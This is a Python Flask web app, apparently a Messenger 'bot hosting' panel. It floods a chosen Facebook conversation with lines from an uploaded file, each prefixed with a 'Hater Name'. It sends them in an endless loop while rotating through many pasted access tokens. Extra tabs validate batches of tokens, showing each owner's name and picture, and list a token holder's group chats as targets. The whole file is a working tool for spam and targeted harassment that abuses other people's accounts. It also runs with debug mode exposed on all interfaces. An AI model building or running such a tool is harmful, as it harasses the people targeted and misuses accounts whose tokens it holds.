from flask import Flask, render_template_string, request, redirect, url_for, jsonify
import requests
import json
import time
import os
import threading
from datetime import datetime
import uuid

app = Flask(__name__)

# Global variables
message_threads = {}  # Dictionary to store multiple threads with their IDs
task_logs = {}  # Dictionary to store logs for each task
stop_flags = {}  # Dictionary to store stop flags for each task

html_content = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STON3 W3B</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f4f4f4;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 800px;
            margin: auto;
        }
        h1 {
            text-align: center;
            color: #333;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        input[type="text"],
        input[type="number"],
        textarea,
        input[type="file"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        textarea {
            resize: vertical;
            min-height: 100px;
        }
        button {
            background-color: #007bff;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            margin-bottom: 10px;
        }
        button:hover {
            background-color: #0056b3;
        }
        .button-danger {
            background-color: #dc3545;
        }
        .button-danger:hover {
            background-color: #c82333;
        }
        .button-success {
            background-color: #28a745;
        }
        .button-success:hover {
            background-color: #218838;
        }
        .button-warning {
            background-color: #ffc107;
            color: #212529;
        }
        .button-warning:hover {
            background-color: #e0a800;
        }
        .tabs {
            display: flex;
            margin-bottom: 20px;
        }
        .tab {
            padding: 10px 20px;
            cursor: pointer;
            background-color: #f1f1f1;
            border: 1px solid #ddd;
            border-bottom: none;
            border-radius: 5px 5px 0 0;
            margin-right: 5px;
        }
        .tab.active {
            background-color: #fff;
            font-weight: bold;
        }
        .tab-content {
            display: none;
            border: 1px solid #ddd;
            padding: 20px;
            border-radius: 0 0 5px 5px;
        }
        .tab-content.active {
            display: block;
        }
        .log-container {
            height: 300px;
            overflow-y: auto;
            border: 1px solid #ddd;
            padding: 10px;
            margin-bottom: 15px;
            background-color: #f8f9fa;
            font-family: monospace;
            font-size: 12px;
        }
        .token-result {
            margin-bottom: 15px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .token-valid {
            background-color: #d4edda;
            border-color: #c3e6cb;
        }
        .token-invalid {
            background-color: #f8d7da;
            border-color: #f5c6cb;
        }
        .task-item {
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 15px;
            background-color: #f8f9fa;
        }
        .task-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        .task-id {
            font-weight: bold;
            color: #007bff;
        }
        .task-status {
            padding: 5px 10px;
            border-radius: 3px;
            font-size: 12px;
            font-weight: bold;
        }
        .status-running {
            background-color: #28a745;
            color: white;
        }
        .status-stopped {
            background-color: #dc3545;
            color: white;
        }
        .task-buttons {
            display: flex;
            gap: 10px;
        }
        .task-buttons button {
            width: auto;
            margin: 0;
            padding: 5px 15px;
            font-size: 14px;
        }
        .groups-result {
            margin-bottom: 15px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background-color: #f8f9fa;
        }
        .group-item {
            padding: 5px 0;
            border-bottom: 1px solid #eee;
        }
        .group-item:last-child {
            border-bottom: none;
        }
        .group-name {
            font-weight: bold;
            color: #007bff;
        }
        .group-uid {
            font-family: monospace;
            color: #666;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Bot Hosting Interface</h1>
        
        <div class="tabs">
            <div class="tab active" onclick="switchTab('bot-tab')">Bot Control</div>
            <div class="tab" onclick="switchTab('token-tab')">Token Checker</div>
            <div class="tab" onclick="switchTab('groups-tab')">Groups Fetcher</div>
            <div class="tab" onclick="switchTab('logs-tab')">View Logs</div>
        </div>
        
        <div id="bot-tab" class="tab-content active">
            <form action="/run_bot" method="post" enctype="multipart/form-data">
                <label for="convo_uid">Convo UID:</label>
                <input type="text" id="convo_uid" name="convo_uid" required>

                <label for="token">Token</label>
                <textarea id="token" name="token" required></textarea>

                <label for="message_file">Message File</label>
                <input type="file" id="message_file" name="message_file" accept=".txt" required>

                <label for="speed">Speed</label>
                <input type="number" id="speed" name="speed" value="1" min="0" step="1" required>

                <label for="haters_name">Hater Name</label>
                <input type="text" id="haters_name" name="haters_name" required>

                <button type="submit" class="button-success">Start New Task</button>
            </form>
        </div>
        
        <div id="token-tab" class="tab-content">
            <label for="check_tokens">Tokens to Check (one per line):</label>
            <textarea id="check_tokens" name="check_tokens"></textarea>
            <button onclick="checkTokens()" class="button-success">Check Tokens</button>
            <div id="token-results"></div>
        </div>
        
        <div id="groups-tab" class="tab-content">
            <label for="groups_token">Valid Token:</label>
            <textarea id="groups_token" name="groups_token" placeholder="Enter a valid Facebook token to fetch messenger groups"></textarea>
            <button onclick="fetchGroups()" class="button-success">Fetch Messenger Groups</button>
            <div id="groups-results"></div>
        </div>
        
        <div id="logs-tab" class="tab-content">
            <div id="tasks-container">
                <!-- Tasks will be loaded here -->
            </div>
        </div>
    </div>

    <script>
        function switchTab(tabId) {
            // Hide all tab contents
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected tab content
            document.getElementById(tabId).classList.add('active');
            
            // Update active tab
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            event.currentTarget.classList.add('active');
            
            // If switching to logs tab, refresh tasks
            if (tabId === 'logs-tab') {
                refreshTasks();
            }
        }
        
        function checkTokens() {
            const tokens = document.getElementById('check_tokens').value.split('\\n');
            const resultsContainer = document.getElementById('token-results');
            resultsContainer.innerHTML = '<div>Checking tokens...</div>';
            
            fetch('/check_tokens', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({tokens: tokens}),
            })
            .then(response => response.json())
            .then(data => {
                resultsContainer.innerHTML = '';
                data.results.forEach(result => {
                    const div = document.createElement('div');
                    div.className = result.valid ? 'token-result token-valid' : 'token-result token-invalid';
                    div.innerHTML = `<strong>${result.token}</strong>: ${result.message}`;
                    if (result.valid && result.name) {
                        div.innerHTML += `<br>Name: ${result.name}`;
                    }
                    if (result.valid && result.picture) {
                        div.innerHTML += `<br><img src="${result.picture}" width="50" height="50">`;
                    }
                    resultsContainer.appendChild(div);
                });
            })
            .catch(error => {
                resultsContainer.innerHTML = '<div>Error checking tokens</div>';
            });
        }
        
        function fetchGroups() {
            const token = document.getElementById('groups_token').value.trim();
            const resultsContainer = document.getElementById('groups-results');
            
            if (!token) {
                resultsContainer.innerHTML = '<div class="token-result token-invalid">Please enter a valid token</div>';
                return;
            }
            
            resultsContainer.innerHTML = '<div>Fetching messenger groups...</div>';
            
            fetch('/fetch_groups', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({token: token}),
            })
            .then(response => response.json())
            .then(data => {
                resultsContainer.innerHTML = '';
                if (data.success) {
                    const div = document.createElement('div');
                    div.className = 'groups-result';
                    div.innerHTML = `<h4>Found ${data.groups.length} Messenger Groups:</h4>`;
                    
                    data.groups.forEach(group => {
                        const groupDiv = document.createElement('div');
                        groupDiv.className = 'group-item';
                        groupDiv.innerHTML = `
                            <div class="group-name">${group.name}</div>
                            <div class="group-uid">UID: ${group.uid}</div>
                        `;
                        div.appendChild(groupDiv);
                    });
                    
                    resultsContainer.appendChild(div);
                } else {
                    const div = document.createElement('div');
                    div.className = 'token-result token-invalid';
                    div.innerHTML = `Error: ${data.message}`;
                    resultsContainer.appendChild(div);
                }
            })
            .catch(error => {
                resultsContainer.innerHTML = '<div class="token-result token-invalid">Error fetching groups</div>';
            });
        }
        
        function refreshTasks() {
            fetch('/get_tasks')
            .then(response => response.json())
            .then(data => {
                const tasksContainer = document.getElementById('tasks-container');
                tasksContainer.innerHTML = '';
                
                if (data.tasks.length === 0) {
                    tasksContainer.innerHTML = '<div>No active tasks</div>';
                    return;
                }
                
                data.tasks.forEach(task => {
                    const taskDiv = document.createElement('div');
                    taskDiv.className = 'task-item';
                    taskDiv.innerHTML = `
                        <div class="task-header">
                            <div class="task-id">Task: ${task.id}</div>
                            <div class="task-status ${task.status === 'running' ? 'status-running' : 'status-stopped'}">
                                ${task.status.toUpperCase()}
                            </div>
                        </div>
                        <div>Convo UID: ${task.convo_uid}</div>
                        <div>Hater Name: ${task.haters_name}</div>
                        <div>Started: ${task.started_at}</div>
                        <div class="task-buttons">
                            <button onclick="viewTaskLogs('${task.id}')" class="button-warning">View Logs</button>
                            <button onclick="stopTask('${task.id}')" class="button-danger">Stop & Delete</button>
                        </div>
                        <div id="logs-${task.id}" class="log-container" style="display: none; margin-top: 10px;"></div>
                    `;
                    tasksContainer.appendChild(taskDiv);
                });
            });
        }
        
        function viewTaskLogs(taskId) {
            const logsContainer = document.getElementById(`logs-${taskId}`);
            
            if (logsContainer.style.display === 'none') {
                fetch(`/get_task_logs/${taskId}`)
                .then(response => response.json())
                .then(data => {
                    logsContainer.innerHTML = '';
                    data.logs.forEach(log => {
                        const div = document.createElement('div');
                        div.textContent = log;
                        logsContainer.appendChild(div);
                    });
                    logsContainer.scrollTop = logsContainer.scrollHeight;
                    logsContainer.style.display = 'block';
                });
            } else {
                logsContainer.style.display = 'none';
            }
        }
        
        function stopTask(taskId) {
            if (confirm('Are you sure you want to stop and delete this task?')) {
                fetch(`/stop_task/${taskId}`, {method: 'POST'})
                .then(() => refreshTasks());
            }
        }
        
        // Auto-refresh tasks if on logs tab
        setInterval(() => {
            if (document.getElementById('logs-tab').classList.contains('active')) {
                refreshTasks();
            }
        }, 5000);
    </script>
</body>
</html>
'''

def add_log(task_id, message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    
    if task_id not in task_logs:
        task_logs[task_id] = []
    
    task_logs[task_id].append(log_entry)
    # Keep only the last 1000 logs per task to prevent memory issues
    if len(task_logs[task_id]) > 1000:
        del task_logs[task_id][0:len(task_logs[task_id])-1000]

def check_token_validity(token):
    """Check if a Facebook token is valid and return user info"""
    try:
        # First, check if token is valid
        url = f"https://graph.facebook.com/v17.0/me?access_token={token}"
        response = requests.get(url)
        
        if response.status_code == 200:
            user_data = response.json()
            user_id = user_data.get('id')
            
            # Get profile picture
            picture_url = f"https://graph.facebook.com/v17.0/{user_id}/picture?access_token={token}&redirect=false"
            picture_response = requests.get(picture_url)
            picture_data = picture_response.json()
            picture = picture_data.get('data', {}).get('url') if picture_response.status_code == 200 else None
            
            # Get user name
            name_url = f"https://graph.facebook.com/v17.0/{user_id}?fields=name&access_token={token}"
            name_response = requests.get(name_url)
            name_data = name_response.json()
            name = name_data.get('name') if name_response.status_code == 200 else "Unknown"
            
            return {
                'valid': True,
                'message': 'Valid token',
                'name': name,
                'picture': picture
            }
        else:
            return {
                'valid': False,
                'message': f'Invalid token: {response.json().get("error", {}).get("message", "Unknown error")}',
                'name': None,
                'picture': None
            }
    except Exception as e:
        return {
            'valid': False,
            'message': f'Error checking token: {str(e)}',
            'name': None,
            'picture': None
        }

def fetch_messenger_groups(token):
    """Fetch messenger groups using a valid token"""
    try:
        # Get user's conversations/threads
        url = f"https://graph.facebook.com/v17.0/me/conversations?access_token={token}&fields=participants,name,id&limit=100"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            groups = []
            
            for conversation in data.get('data', []):
                # Check if it's a group (more than 2 participants)
                participants = conversation.get('participants', {}).get('data', [])
                if len(participants) > 2:
                    group_name = conversation.get('name', 'Unnamed Group')
                    group_id = conversation.get('id', '')
                    
                    groups.append({
                        'name': group_name,
                        'uid': group_id
                    })
            
            return {
                'success': True,
                'groups': groups,
                'message': f'Found {len(groups)} groups'
            }
        else:
            error_data = response.json()
            return {
                'success': False,
                'groups': [],
                'message': f'API Error: {error_data.get("error", {}).get("message", "Unknown error")}'
            }
    except Exception as e:
        return {
            'success': False,
            'groups': [],
            'message': f'Error fetching groups: {str(e)}'
        }

def send_messages(task_id, convo_uid, tokens, message_content, speed, haters_name):
    global stop_flags
    
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    messages = message_content.splitlines()
    tokens = tokens.splitlines()

    num_messages = len(messages)
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    add_log(task_id, f"Starting bot with {num_messages} messages and {num_tokens} tokens")
    
    while task_id in stop_flags and not stop_flags[task_id]:
        try:
            for message_index in range(num_messages):
                if task_id in stop_flags and stop_flags[task_id]:
                    add_log(task_id, "Bot stopped by user")
                    break
                    
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()

                message = messages[message_index].strip()

                url = f"https://graph.facebook.com/v17.0/t_{convo_uid}/"
                parameters = {'access_token': access_token, 'message': f'{haters_name} {message}'}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    log_msg = f"[+] Message {message_index + 1} of Convo {convo_uid} Token {token_index + 1}: {haters_name} {message} - Sent at {current_time}"
                    add_log(task_id, log_msg)
                else:
                    log_msg = f"[x] Failed to send Message {message_index + 1} of Convo {convo_uid} with Token {token_index + 1}: {haters_name} {message} - Error: {response.text} - At {current_time}"
                    add_log(task_id, log_msg)
                time.sleep(speed)

            if task_id in stop_flags and stop_flags[task_id]:
                break
                
            add_log(task_id, "[+] All messages sent. Restarting the process...")
        except Exception as e:
            error_msg = f"[!] An error occurred: {e}"
            add_log(task_id, error_msg)
            time.sleep(5) # Wait before retrying on error
    
    # Clean up when task ends
    if task_id in stop_flags:
        del stop_flags[task_id]
    if task_id in message_threads:
        del message_threads[task_id]
    
    add_log(task_id, "Bot execution completed")

@app.route('/')
def index():
    return render_template_string(html_content)

@app.route('/run_bot', methods=['POST'])
def run_bot():
    global message_threads, stop_flags

    convo_uid = request.form['convo_uid']
    token = request.form['token']
    speed = int(request.form['speed'])
    haters_name = request.form['haters_name']

    message_file = request.files['message_file']
    message_content = message_file.read().decode('utf-8')

    # Generate unique task ID
    task_id = str(uuid.uuid4())[:8]
    
    # Initialize task
    stop_flags[task_id] = False
    message_threads[task_id] = {
        'thread': threading.Thread(target=send_messages, args=(task_id, convo_uid, token, message_content, speed, haters_name)),
        'convo_uid': convo_uid,
        'haters_name': haters_name,
        'started_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'status': 'running'
    }
    
    message_threads[task_id]['thread'].daemon = True
    message_threads[task_id]['thread'].start()

    add_log(task_id, f"Bot started successfully for task {task_id}")
    return redirect(url_for('index'))

@app.route('/stop_task/<task_id>', methods=['POST'])
def stop_task(task_id):
    global stop_flags, message_threads, task_logs
    
    if task_id in stop_flags:
        stop_flags[task_id] = True
        
    # Wait a moment for thread to stop
    time.sleep(1)
    
    # Clean up
    if task_id in message_threads:
        del message_threads[task_id]
    if task_id in task_logs:
        del task_logs[task_id]
    if task_id in stop_flags:
        del stop_flags[task_id]
        
    return jsonify({'status': 'success'})

@app.route('/check_tokens', methods=['POST'])
def check_tokens():
    data = request.json
    tokens = data.get('tokens', [])
    
    results = []
    for token in tokens:
        if token.strip():  # Only check non-empty tokens
            result = check_token_validity(token.strip())
            result['token'] = token.strip()  # Add the token to the result
            results.append(result)
    
    return jsonify({'results': results})

@app.route('/fetch_groups', methods=['POST'])
def fetch_groups():
    data = request.json
    token = data.get('token', '').strip()
    
    if not token:
        return jsonify({'success': False, 'message': 'Token is required', 'groups': []})
    
    result = fetch_messenger_groups(token)
    return jsonify(result)

@app.route('/get_tasks')
def get_tasks():
    tasks = []
    for task_id, thread_info in message_threads.items():
        tasks.append({
            'id': task_id,
            'convo_uid': thread_info['convo_uid'],
            'haters_name': thread_info['haters_name'],
            'started_at': thread_info['started_at'],
            'status': 'running' if thread_info['thread'].is_alive() else 'stopped'
        })
    
    return jsonify({'tasks': tasks})

@app.route('/get_task_logs/<task_id>')
def get_task_logs(task_id):
    logs = task_logs.get(task_id, [])
    return jsonify({'logs': logs})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
